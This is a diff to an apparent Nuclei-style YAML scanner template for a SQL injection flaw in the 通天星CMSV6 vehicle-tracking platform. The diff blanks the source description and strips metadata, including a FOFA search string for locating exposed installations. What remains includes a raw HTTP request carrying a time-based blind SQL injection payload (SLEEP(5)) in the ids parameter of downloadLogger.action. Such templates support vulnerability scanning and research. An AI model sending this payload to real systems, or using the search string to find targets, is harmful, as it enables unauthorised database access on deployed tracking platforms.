@@ -3,12 +3,8 @@ info:
   name: 通天星CMSV6车载定位监控平台 disable SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/efyyfi6emxc4dz5m'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: efyyfi6emxc4dz5m
-    fofa: body="/808gps/"
 http:
 - raw:
   - 'GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1
